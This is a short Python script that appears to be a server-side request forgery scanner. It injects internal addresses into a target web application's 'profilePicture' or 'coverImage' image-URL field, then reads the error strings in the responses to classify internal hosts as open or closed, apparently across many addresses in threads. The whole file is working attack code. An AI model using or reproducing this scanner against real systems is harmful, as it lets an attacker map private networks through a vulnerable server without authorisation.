import requests
from threading import Thread
import ipaddress

import request_parse
def scanNet(request_info, network, url):
    try:
        method, path , header, body = request_info
        body_data = body.copy()
        if 'profilePicture' in body_data:
            body_data['profilePicture'] = f"http://{network}"
        else:
            body_data['coverImage'] = f"http://{network}"
        rsp = requests.request(method, f"{url}{path}", headers=header, json=body_data, timeout=30)
        print(f"[{network}] Status: {rsp.status_code}")
        if rsp.status_code == 200 or ("ECONNREFUSED" in rsp.text):
            print(f"Network {network} is open.")
        elif "EHOSTUNREACH" in rsp.text or "ETIMEDOUT" in rsp.text:
            print(f"Network {network} is closed/filtered.")
        else:
            print(f"Network {network} response: {rsp.text}")
    except requests.exceptions.RequestException as exc:
        print(f"Network {network} lỗi: {exc}  ")


